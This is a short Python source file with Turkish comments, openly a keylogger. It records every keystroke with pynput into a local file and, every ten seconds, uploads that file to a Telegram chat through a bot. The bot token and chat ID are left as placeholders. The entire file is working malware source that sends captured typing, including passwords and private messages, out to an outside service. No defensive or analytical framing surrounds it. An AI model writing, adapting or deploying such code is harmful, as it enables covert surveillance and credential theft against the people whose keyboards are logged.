from pynput.keyboard import Key, Listener
from telegram import Bot
import schedule
import time
import asyncio

# Telegram Bot API Token'ınızı buraya ekleyin
TOKEN = "yok"
CHAT_ID = "yok"  # Dosyayı göndereceğiniz kullanıcı veya grubun ID'si

# Telegram botunuzu oluşturun
bot = Bot(token=TOKEN)

# Girdileri kaydedeceğimiz dosyanın adı
log_file = "keylog.txt"

# Tuşlara basıldığında bu işlev çalışacak
def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f'{key.char}')  # Normal tuşlar
        except AttributeError:
            if key == Key.space:
                f.write(' ')  # Boşluk tuşunu ekler
            elif key == Key.enter:
                f.write('\n')  # Enter tuşunu yeni satır yapar
            else:
                f.write(f' {key} ')  # Diğer özel tuşlar (Shift, Ctrl vs.)

# Dinleyiciyi durdurmak için kullanılır (ESC'ye basılınca)
def on_release(key):
    if key == Key.esc:
        # ESC'ye basıldığında dinleyici durur
        return False

# Asenkron olarak dosyayı Telegram botuna gönderme fonksiyonu
async def send_keylog():
    with open("keylog.txt", "rb") as file:
        await bot.send_document(chat_id=CHAT_ID, document=file, caption="Keylogger file")

# Zamanlayıcıyı ayarla (Her 10 saniyede bir dosyayı Telegram'a gönderir)
def schedule_task():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    schedule.every(10).seconds.do(lambda: loop.run_until_complete(send_keylog()))

# Klavye dinleyicisini başlat
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Ana döngü: Hem keylogger hem de zamanlayıcıyı çalıştırır
if __name__ == "__main__":
    # Keylogger'ı ayrı bir iş parçacığı olarak çalıştır
    import threading
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    # Zamanlayıcı görevini başlat
    schedule_task()

    # Zamanlayıcı döngüsü
    while True:
        schedule.run_pending()
        time.sleep(1)
